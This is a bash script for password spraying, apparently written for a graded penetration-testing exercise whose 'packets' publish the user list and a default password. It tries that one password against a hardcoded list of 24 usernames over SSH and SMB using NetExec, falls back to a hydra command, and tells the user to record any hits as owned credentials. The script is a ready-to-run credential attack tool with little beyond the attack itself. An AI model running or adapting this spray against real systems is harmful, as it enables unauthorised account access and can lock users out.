#!/usr/bin/env bash
# spray.sh — try the announced default password against the approved user list, on both boxes.
#
# The packets publish the user list, so there is no reason to type it. Anything that comes back
# [+] is a working credential, and each one is a graded "initial access / credential abuse" item.
#
# Usage:
#   bash spray.sh <PD_IP> <default_password>
#   bash spray.sh <PD_IP> <default_password> /path/to/users.txt
#
# Notes:
#   - tries SSH on the PD, SMB on anything that answers on 445
#   - --continue-on-success matters: without it, nxc stops at the first hit and you only find one
#   - never spray more than a handful of passwords at an AD account, or you will lock accounts out

set -u
TARGET="${1:-}"
PW="${2:-}"
LIST="${3:-}"

if [ -z "$TARGET" ] || [ -z "$PW" ]; then
  echo "usage: bash spray.sh <IP> <default_password> [userlist]"
  exit 1
fi

TMP="$(mktemp)"
if [ -n "$LIST" ] && [ -f "$LIST" ]; then
  cp "$LIST" "$TMP"
else
  cat > "$TMP" <<'EOF'
ftruman
htruman
abrennan
lmoran
bbriggs
cbraxford
dcooper
jholcomb
hawk2hill
lpalmer
bob
exim
ljohnson
whayward
broundtree
lshelvy
jim
arosenfield
ahorne
emt
doctor
nurse
svc_ehr
ljacoby
EOF
  echo "[i] using the approved list from the packets ($(wc -l < "$TMP") names)"
fi

echo "=== spraying $TARGET with the announced default password ==="
echo
echo "--- SSH (the PD) ---"
if command -v nxc >/dev/null 2>&1; then
  nxc ssh "$TARGET" -u "$TMP" -p "$PW" --continue-on-success 2>&1 | grep -E '\[.\]|PLAIN|ERROR' | head -40
  echo
  echo "--- SMB (the DC or anything on 445) ---"
  nxc smb "$TARGET" -u "$TMP" -p "$PW" --continue-on-success 2>&1 | grep -E '\[.\]|PLAIN|ERROR' | head -40
else
  echo "[!] nxc not installed. Fallback: hydra -L $TMP -p '$PW' ssh://$TARGET"
fi

rm -f "$TMP"
echo
echo "Anything marked [+] is a credential you now own. Write it down, then screenshot the output:"
echo "  bash evidence.sh \"spray hit\" \"$TARGET\" \"nxc spray default password\""
